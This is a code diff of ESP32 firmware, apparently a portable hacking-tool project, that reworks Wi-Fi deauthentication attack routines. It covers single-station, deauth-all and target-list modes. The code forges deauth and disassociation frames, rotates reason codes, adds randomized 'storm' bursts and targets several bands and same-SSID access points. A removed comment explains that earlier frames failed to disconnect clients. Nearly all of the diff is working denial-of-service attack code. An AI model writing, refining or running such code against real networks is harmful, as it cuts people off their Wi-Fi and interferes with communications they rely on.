@@ -63,6 +63,14 @@ static std::vector<Host> detectedClients;
 static uint8_t scanTargetBSSID[6];
 static bool clientScanActive = false;
 
+// Helper function to convert MAC to string
+String macToString(const uint8_t *mac) {
+    char buf[18];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return String(buf);
+}
+
 WiFiState saveWiFiState() {
     WiFiState state;
     state.was_connected = WiFi.isConnected();
@@ -180,9 +188,6 @@ const uint8_t* getDeauthReasons(int band, int* count) {
     return DEAUTH_REASONS;
 }
 
-// Returns the channel of target_bssid. If `found` is provided, it is set to true only
-// when target_bssid actually matched an AP in the scan (so callers can tell an AP MAC
-// apart from a client MAC that just falls back to the current channel).
 int getAPChannel(const uint8_t *target_bssid, bool *found = nullptr) {
     static unsigned long cache_time = 0;
     static uint8_t cached_bssid[6] = {0};
@@ -265,23 +270,29 @@ bool initializeDeauthMode(int channel, bool enhanced_mode, WiFiState& savedState
         return tryMonitorMode(channel);
     }
     
-    // Save current WiFi state before disconnecting
     savedState = saveWiFiState();
     
-    // Disconnect from any existing network
+    // CRITICAL FIX: Properly disconnect and reset WiFi
     wifiDisconnect();
     delay(10);
     
-    // Switch to AP mode
-    WiFi.mode(WIFI_AP);
+    // Stop WiFi completely to reset state
+    esp_wifi_stop();
+    delay(10);
     
-    // Try to start AP
+    // Initialize with AP mode
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    esp_wifi_init(&cfg);
+    esp_wifi_set_mode(WIFI_MODE_AP);
+    esp_wifi_start();
+    delay(10);
+    
+    // Now start softAP
     String currentSsid = WiFi.SSID();
     if (currentSsid.length() == 0) {
         currentSsid = "DEAUTH_" + String(random(1000, 9999));
     }
     
-    // Try multiple times to start AP
     int attempts = 0;
     bool apStarted = false;
     while (attempts < 3 && !apStarted) {
@@ -296,6 +307,9 @@ bool initializeDeauthMode(int channel, bool enhanced_mode, WiFiState& savedState
         displayError("Failed to start Deauth AP", true);
         return false;
     }
+    
+    // Set channel after AP is started
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     
     return true;
 }
@@ -316,6 +330,7 @@ void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, in
         esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
     }
     if (enhanced_mode) {
+        // CRITICAL FIX: Use WIFI_IF_AP for all deauth transmissions
         wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
         wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
         wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
@@ -335,6 +350,8 @@ void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, in
 
 void stationDeauth(Host host, const uint8_t *apBssidIn) {
     WiFiState savedState = saveWiFiState();
+    bool wasConnected = savedState.was_connected;
+    
     uint8_t hostMAC[6];
     stringToMAC(host.mac.c_str(), hostMAC);
     if (isMACZero(hostMAC)) {
@@ -342,18 +359,12 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
         return;
     }
 
-    // Resolve the two addresses a valid deauth needs: the client (frame RA/destination)
-    // and the BSSID of the AP it is associated with (frame TA + addr3). Reusing the same
-    // MAC for all three fields (the previous behavior) produced frames that both the AP
-    // and the client silently drop, which is why targets kept "receiving" packets without
-    // ever disconnecting.
-    uint8_t targetMAC[6];   // client / destination (broadcast when the client is unknown)
-    uint8_t apBSSID[6];     // AP the client is associated with (source / addr3)
+    uint8_t targetMAC[6];
+    uint8_t apBSSID[6];
     uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     int channel = 0;
 
     if (apBssidIn != nullptr && !isMACZero(apBssidIn)) {
-        // Caller supplied both the client and its AP (client picked from an AP's client list)
         memcpy(targetMAC, hostMAC, 6);
         memcpy(apBSSID, apBssidIn, 6);
         channel = getAPChannel(apBSSID);
@@ -361,12 +372,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
         bool hostIsAP = false;
         int hostChannel = getAPChannel(hostMAC, &hostIsAP);
         if (hostIsAP) {
-            // host is itself an AP -> broadcast deauth to every client of that AP
             memcpy(apBSSID, hostMAC, 6);
             memcpy(targetMAC, broadcast_mac, 6);
             channel = hostChannel;
         } else {
-            // host is a station; target it through the AP we are currently associated with
             uint8_t gw[6] = {0};
             getGatewayMAC(gw);
             if (!isMACZero(gw)) {
@@ -374,7 +383,6 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                 memcpy(targetMAC, hostMAC, 6);
                 channel = getAPChannel(apBSSID);
             } else {
-                // No AP context available; fall back to broadcasting from the host MAC
                 memcpy(apBSSID, hostMAC, 6);
                 memcpy(targetMAC, broadcast_mac, 6);
                 channel = hostChannel;
@@ -387,7 +395,6 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
         return;
     }
     
-    bool wasConnected = savedState.was_connected;
     int band = getWiFiBand(channel);
     bool is_5ghz = (band == 1 || band == 2);
     cacheSameSSIDAPs();
@@ -404,6 +411,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                               (ap_24ghz.size() > 0 && ap_6ghz.size() > 0) ||
                               (ap_5ghz.size() > 0 && ap_6ghz.size() > 0);
     
+    // Try enhanced mode first
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
         if (!initializeDeauthMode(channel, false, savedState)) {
@@ -420,21 +428,16 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
     buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, apBSSID, apBSSID, 0x07, true);
     buildOptimizedDeauthFrame(deauth_sta_to_ap, apBSSID, targetMAC, apBSSID, 0x07, false);
     buildOptimizedDeauthFrame(disassoc_sta_to_ap, apBSSID, targetMAC, apBSSID, 0x07, true);
+    
     drawMainBorderWithTitle("Station Deauth");
     tft.setTextSize(FP);
-    padprintln("Trying to deauth one target.");
-    padprintln("Tgt:" + host.mac);
+    padprintln("Target: " + host.mac);
+    padprintln("AP: " + macToString(apBSSID));
     String bandStr = (band == 1) ? "5GHz" : (band == 2) ? "6GHz" : "2.4GHz";
     padprintln("CH:" + String(channel) + " (" + bandStr + ")");
     padprintln("Mode:" + String(enhanced_mode ? "Enhanced" : "AP"));
     if (useMultipleAPs) {
         padprintln("Mesh: " + String(sameSSID_APs.size()) + " APs");
-        if (has_multiple_bands) {
-            padprintln("MULTI-BAND ATTACK");
-            if (ap_24ghz.size() > 0) padprintln("  2.4GHz: " + String(ap_24ghz.size()) + " APs");
-            if (ap_5ghz.size() > 0) padprintln("  5GHz: " + String(ap_5ghz.size()) + " APs");
-            if (ap_6ghz.size() > 0) padprintln("  6GHz: " + String(ap_6ghz.size()) + " APs");
-        }
     }
     padprintln("");
     padprintln("Press BACK to STOP.");
@@ -454,6 +457,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
     bool storm_active = false;
     uint32_t burst_counter = 0;
     uint8_t consecutive_failures = 0;
+    
     while (!check(EscPress)) {
         if (cont % 20 == 0) {
             int reason_count = 0;
@@ -461,6 +465,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             reason_index = (reason_index + 1) % reason_count;
             current_reason = reasons[reason_index];
         }
+        
         if (useMultipleAPs && has_multiple_bands) {
             int band_cycle = (cont / 4) % 3;
             APInfo* target_ap = nullptr;
@@ -542,6 +547,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             total_frames += 4;
             burst_counter++;
         }
+        
         if (cont % 5 == 0) {
             uint8_t broadcast_frame[26];
             int reason_count = 0;
@@ -561,6 +567,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             vTaskDelay(pdMS_TO_TICKS(1));
             total_frames++;
         }
+        
         if (cont % 50 == 0) {
             if (burst_counter > 100 && random(100) < 30) {
                 storm_active = true;
@@ -632,6 +639,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                 }
             }
         }
+        
         int delay_ms;
         if (storm_active) {
             delay_ms = random(1, 3);
@@ -642,6 +650,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             delay_ms = random(2, 8);
         }
         delay(delay_ms);
+        
         if (millis() - tmp > 1000) {
             int fps = cont;
             cont = 0;
@@ -657,11 +666,13 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             }
         }
     }
+    
     if (enhanced_mode) {
         esp_wifi_set_promiscuous(false);
     }
     wifiDisconnect();
     WiFi.mode(WIFI_STA);
+    
     tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
     padprintln("Attack stopped.");
     padprintln("Frames sent: " + String(total_frames));
@@ -673,9 +684,8 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
         padprintln("Multi-band attack used");
     }
     
-    // Restore WiFi connection if we were connected
     if (wasConnected) {
-        padprintln("Restoring WiFi connection...");
+        padprintln("Restoring WiFi...");
         restoreWiFiState(savedState);
     }
     delay(1000);
@@ -687,6 +697,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
     int band = getWiFiBand(channel);
     cacheSameSSIDAPs();
     bool useMultipleAPs = sameSSID_APs.size() > 1;
+    
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
         if (!initializeDeauthMode(channel, false, savedState)) {
@@ -694,6 +705,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
             return;
         }
     }
+    
     drawMainBorderWithTitle("Deauth All");
     tft.setTextSize(FP);
     padprintln("Deauthing all clients...");
@@ -720,6 +732,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
     int reason_index = 0;
     bool storm_active = false;
     uint32_t burst_counter = 0;
+    
     while (!check(EscPress)) {
         if (total_frames % 20 == 0) {
             int reason_count = 0;
@@ -729,6 +742,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
         int reason_count = 0;
         const uint8_t* reasons = getDeauthReasons(band, &reason_count);
         uint8_t reason = reasons[reason_index];
+        
         if (useMultipleAPs) {
             ap_index = (ap_index + 1) % sameSSID_APs.size();
             APInfo& current_ap = sameSSID_APs[ap_index];
@@ -739,6 +753,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
         } else {
             buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, reason, false);
         }
+        
         if (enhanced_mode) {
             wifiRawTx(WIFI_IF_AP, frame, 26);
         } else {
@@ -746,9 +761,11 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
         }
         total_frames++;
         burst_counter++;
+        
         if (total_frames % 100 == 0 && random(100) < 40) {
             storm_active = true;
         }
+        
         int delay_ms;
         if (storm_active) {
             delay_ms = random(1, 3);
@@ -775,6 +792,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
             delay_ms = random(5, 15);
         }
         delay(delay_ms);
+        
         if (millis() - start_time > 2000) {
             start_time = millis();
             tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
@@ -784,6 +802,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
             }
         }
     }
+    
     if (enhanced_mode) {
         esp_wifi_set_promiscuous(false);
     }
@@ -794,9 +813,8 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
     padprintln("Attack stopped.");
     padprintln("Frames sent: " + String(total_frames));
     
-    // Restore WiFi connection if we were connected
     if (wasConnected) {
-        padprintln("Restoring WiFi connection...");
+        padprintln("Restoring WiFi...");
         restoreWiFiState(savedState);
     }
     delay(1500);
@@ -892,6 +910,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
     int band = getWiFiBand(channel);
     cacheSameSSIDAPs();
     bool useMultipleAPs = sameSSID_APs.size() > 1;
+    
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
         if (!initializeDeauthMode(channel, false, savedState)) {
@@ -899,6 +918,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
             return;
         }
     }
+    
     drawMainBorderWithTitle("Deauth List");
     tft.setTextSize(FP);
     padprintln("Deauthing " + String(targets.size()) + " targets...");
@@ -923,6 +943,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
     int ap_index = 0;
     bool storm_active = false;
     uint32_t burst_counter = 0;
+    
     while (!check(EscPress)) {
         if (target_index >= targets.size()) {
             target_index = 0;
@@ -935,6 +956,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
             int reason_count = 0;
             const uint8_t* reasons = getDeauthReasons(band, &reason_count);
             uint8_t reason = reasons[random(reason_count)];
+            
             if (useMultipleAPs) {
                 ap_index = (ap_index + 1) % sameSSID_APs.size();
                 APInfo& current_ap = sameSSID_APs[ap_index];
@@ -951,6 +973,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
                 buildOptimizedDeauthFrame(frames[2], targetMAC, hostMAC, targetMAC, reason, false);
                 buildOptimizedDeauthFrame(frames[3], targetMAC, hostMAC, targetMAC, reason, true);
             }
+            
             for (int i = 0; i < 4; i++) {
                 if (enhanced_mode) {
                     wifiRawTx(WIFI_IF_AP, frames[i], 26);
@@ -962,11 +985,13 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
             }
         }
         target_index++;
+        
         if (storm_active) {
             delay(random(1, 3));
         } else {
             delay(random(1, 5));
         }
+        
         if (millis() - start_time > 2000) {
             start_time = millis();
             tft.fillRect(tftWidth - 100, tftHeight - 40, 100, 40, TFT_BLACK);
@@ -976,6 +1001,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
             }
         }
     }
+    
     if (enhanced_mode) {
         esp_wifi_set_promiscuous(false);
     }
@@ -986,9 +1012,8 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
     padprintln("Attack stopped.");
     padprintln("Frames sent: " + String(total_frames));
     
-    // Restore WiFi connection if we were connected
     if (wasConnected) {
-        padprintln("Restoring WiFi connection...");
+        padprintln("Restoring WiFi...");
         restoreWiFiState(savedState);
     }
     delay(1000);
@@ -1036,7 +1061,6 @@ void showAPSelectionForClientDeauth() {
     loopOptions(options);
 }
 
-// Client detection sniffer callback
 void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (!clientScanActive) return;
 
@@ -1137,7 +1161,6 @@ void scanClientsOnAP(uint8_t* targetMAC, int channel) {
     }
     esp_wifi_set_promiscuous_rx_cb(NULL);
 
-    // Restore WiFi connection if we were connected
     if (wasConnected) {
         restoreWiFiState(savedState);
     }
@@ -1148,8 +1171,6 @@ void scanClientsOnAP(uint8_t* targetMAC, int channel) {
 void showClientSelectionForDeauth(const std::vector<Host>& clients, uint8_t* targetMAC, int channel) {
     options.clear();
 
-    // Copy the AP BSSID so each client-deauth lambda carries it by value (the source
-    // buffer lives on a caller stack frame that may be gone by the time it runs).
     uint8_t apBssid[6];
     memcpy(apBssid, targetMAC, 6);
 
